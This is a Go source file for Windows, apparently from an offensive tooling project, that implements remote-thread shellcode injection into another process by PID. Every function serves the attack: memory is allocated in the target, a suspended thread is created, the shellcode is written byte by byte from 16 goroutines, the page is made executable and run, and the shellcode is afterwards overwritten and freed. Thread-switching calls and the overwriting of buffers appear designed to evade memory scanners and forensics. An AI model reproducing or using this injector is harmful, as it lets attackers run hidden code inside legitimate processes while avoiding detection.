// +build windows

package injector

import (
	"context"
	"sync"
	"time"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/module/windows/api"
	"project/internal/random"
	"project/internal/security"
	"project/internal/xpanic"
)

// InjectShellcode is used to inject shellcode to a process, it will block until execute finish.
// [Warning]: shellcode slice will be covered.
func InjectShellcode(pid uint32, shellcode []byte) error {
	defer security.CoverBytes(shellcode)
	// ------------------------------------create remote thread------------------------------------
	// open target process
	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
	pHandle, err := api.OpenProcess(da, false, pid)
	if err != nil {
		return err
	}
	var processHandleClosed bool
	defer func() {
		if !processHandleClosed {
			api.CloseHandle(pHandle)
		}
	}()
	// alloc memory for shellcode
	doneVA := security.SwitchThreadAsync()
	size := uintptr(len(shellcode))
	const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
	memAddr, err := api.VirtualAllocEx(pHandle, 0, size, memType, windows.PAGE_NOACCESS)
	if err != nil {
		return err
	}
	// create remote thread first and suspend
	doneCRT := security.SwitchThreadAsync()
	const creationFlags = windows.CREATE_SUSPENDED
	tHandle, _, err := api.CreateRemoteThread(pHandle, nil, 0, memAddr, nil, creationFlags)
	if err != nil {
		return err
	}
	var threadHandleClosed bool
	defer func() {
		if !threadHandleClosed {
			api.CloseHandle(tHandle)
		}
	}()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneVA, doneCRT)
	// --------------------------------------write shellcode---------------------------------------
	err = writeShellcode(pHandle, shellcode, memAddr, size)
	if err != nil {
		return err
	}
	// ----------------------------------------wait thread-----------------------------------------
	security.SwitchThread()
	_, err = windows.ResumeThread(tHandle)
	if err != nil {
		return errors.Wrap(err, "failed to resume thread")
	}
	// close process handle at once and reopen after execute finish
	api.CloseHandle(pHandle)
	processHandleClosed = true
	// wait thread for wait shellcode execute finish
	security.SwitchThread()
	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
	if err != nil {
		return errors.Wrap(err, "failed to wait thread")
	}
	// close thread handle at once
	api.CloseHandle(tHandle)
	threadHandleClosed = true
	return cleanShellcode(pid, memAddr, size)
}

func writeShellcode(pHandle windows.Handle, shellcode []byte, memAddr uintptr, size uintptr) error {
	// set read write
	doneVP := security.SwitchThreadAsync()
	oldProtect := new(uint32)
	err := api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_READWRITE, oldProtect)
	if err != nil {
		return err
	}
	// write shellcode with multi goroutine
	const title = "writeShellcode"
	doneWPM := security.SwitchThreadAsync()
	rand := random.NewRand()
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	type item struct {
		b    byte
		addr uintptr
	}
	shellcodeCh := make(chan *item, 16)
	wg := sync.WaitGroup{}
	// start a shellcode sender
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				xpanic.Log(r, title)
			}
		}()
		for i := uintptr(0); i < size; i++ {
			payload := &item{
				b:    shellcode[i],
				addr: memAddr + i,
			}
			select {
			case shellcodeCh <- payload:
			case <-ctx.Done():
				return
			}
			// cover shellcode at once
			shellcode[i] = byte(rand.Int64())
		}
		close(shellcodeCh)
	}()
	// shellcode writer
	writer := func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				xpanic.Log(r, title)
			}
		}()
		for {
			select {
			case item := <-shellcodeCh:
				if item == nil {
					return
				}
				_, err := api.WriteProcessMemory(pHandle, item.addr, []byte{item.b})
				if err != nil {
					return
				}
				item.b = byte(rand.Int64())
			case <-ctx.Done():
				return
			}
		}
	}
	// start 16 shellcode writer
	for i := 0; i < 16; i++ {
		wg.Add(1)
		go writer()
	}
	wg.Wait()
	// set shellcode page execute
	doneVP2 := security.SwitchThreadAsync()
	err = api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_EXECUTE, oldProtect)
	if err != nil {
		return err
	}
	// wait thread switch
	security.WaitSwitchThreadAsync(ctx, doneVP, doneWPM, doneVP2)
	return nil
}

// cleanShellcode is used to clean shellcode and free allocated memory.
func cleanShellcode(pid uint32, memAddr uintptr, size uintptr) error {
	// reopen target process, maybe failed like process is terminated
	const da = windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
	pHandle, err := api.OpenProcess(da, false, pid)
	if err != nil {
		return err
	}
	defer api.CloseHandle(pHandle)
	// clean shellcode and free it
	doneVP := security.SwitchThreadAsync()
	oldProtect := new(uint32)
	err = api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_READWRITE, oldProtect)
	if err != nil {
		return err
	}
	// cover raw shellcode
	doneWPM := security.SwitchThreadAsync()
	rand := random.NewRand()
	_, err = api.WriteProcessMemory(pHandle, memAddr, rand.Bytes(int(size)))
	if err != nil {
		return errors.WithMessage(err, "failed to cover shellcode to target process")
	}
	// free memory
	doneVF := security.SwitchThreadAsync()
	err = api.VirtualFreeEx(pHandle, memAddr, 0, windows.MEM_RELEASE)
	if err != nil {
		return errors.Wrap(err, "failed to release covered memory")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneVP, doneWPM, doneVF)
	return nil
}
